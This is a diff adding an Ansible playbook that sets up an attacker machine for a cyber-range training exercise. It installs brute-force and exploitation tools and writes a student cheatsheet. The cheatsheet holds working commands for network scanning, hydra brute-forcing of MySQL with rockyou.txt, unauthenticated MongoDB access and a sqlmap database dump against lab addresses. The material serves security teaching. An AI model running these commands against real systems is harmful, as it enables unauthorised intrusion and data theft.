@@ -1,0 +1,66 @@
+---
+- name: Update apt cache
+  apt:
+    update_cache: yes
+
+- name: Install attack tools
+  apt:
+    pkg:
+      - nmap           # network scanning
+      - hydra          # brute-force (MySQL, SSH, etc.)
+      - medusa         # brute-force alternative
+      - sqlmap         # SQL injection / MySQL enumeration
+      - metasploit-framework   # exploits including MongoDB modules
+      - mongo-tools    # mongodump, mongoexport — direct MongoDB access
+      - default-mysql-client   # mysql CLI for manual DB access
+      - wordlists      # includes rockyou.txt for brute-forcing
+    update_cache: yes
+
+- name: Add host aliases for easy access
+  blockinfile:
+    path: /etc/hosts
+    block: |
+      192.168.20.5 server
+      192.168.30.5 windows-host
+      192.168.40.5 db-server
+
+- name: Create attacker home directory structure
+  file:
+    path: /home/kali/exercise
+    state: directory
+    owner: kali
+    mode: '0755'
+
+- name: Place attack cheatsheet for students
+  copy:
+    dest: /home/kali/exercise/README.txt
+    owner: kali
+    mode: '0644'
+    content: |
+      === CyberRangeCZ Attack Exercise ===
+
+      Targets:
+        db-server (192.168.40.5)
+          - MySQL   : port 3306   (user: dbuser, try brute-force)
+          - MongoDB : port 27017  (unauthenticated — enumerate directly)
+
+      Useful commands:
+
+      --- Network Recon ---
+      nmap -sV -p 3306,27017 192.168.40.5
+
+      --- MySQL Brute-force ---
+      hydra -l dbuser -P /usr/share/wordlists/rockyou.txt mysql://192.168.40.5
+
+      --- MySQL Manual Access ---
+      mysql -h 192.168.40.5 -u dbuser -p
+      > USE company;
+      > SELECT * FROM employees;
+
+      --- MongoDB (no auth) ---
+      mongosh --host 192.168.40.5 --port 27017
+      > use records
+      > db.flags.find()
+
+      --- SQLMap against MySQL ---
+      sqlmap -d "mysql://dbuser:PASSWORD@192.168.40.5/company" --dump
